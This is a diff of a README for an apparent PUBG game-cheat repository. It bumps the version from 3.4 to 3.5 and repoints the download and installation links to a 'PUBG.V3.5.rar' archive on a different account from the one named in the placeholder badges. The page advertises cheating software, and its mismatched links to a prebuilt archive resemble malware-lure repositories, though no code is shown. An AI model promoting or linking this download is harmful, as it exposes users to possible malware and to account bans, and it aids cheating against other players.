@@ -10,7 +10,7 @@
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0a0a12?style=for-the-badge&logo=windows&logoColor=00fff7)](https://github.com/yourname/pubg-rak)
 [![Language](https://img.shields.io/badge/C%2B%2B-23-0a0a12?style=for-the-badge&logo=cplusplus&logoColor=b026ff)](https://github.com/yourname/pubg-rak)
 [![Graphics](https://img.shields.io/badge/Dear%20ImGui-DX11-0a0a12?style=for-the-badge&logoColor=ff2d95)](https://github.com/yourname/pubg-rak)
-[![Version](https://img.shields.io/badge/Version-3.4-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/pubg-rak/releases)
+[![Version](https://img.shields.io/badge/Version-3.5-0a0a12?style=for-the-badge&logoColor=00fff7)](https://github.com/yourname/pubg-rak/releases)
 [![License](https://img.shields.io/badge/License-MIT-0a0a12?style=for-the-badge&logoColor=b026ff)](LICENSE)
 
 <br/>
@@ -32,7 +32,7 @@
 
 </div>
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.4/PUBG.V3.4.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
 
 ## ▸ overview
 
@@ -70,9 +70,9 @@
 | **runtime** | Visual C++ Redistributable 2015–2022 |
 
 
-## ▸ [installation](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.4/PUBG.V3.4.rar)
+## ▸ [installation](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
 
-**1.** download the latest release from the **[Releases](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.4/PUBG.V3.4.rar)** tab
+**1.** download the latest release from the **[Releases](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.5/PUBG.V3.5.rar)** tab
 
 **2.** extract archive to a single
 
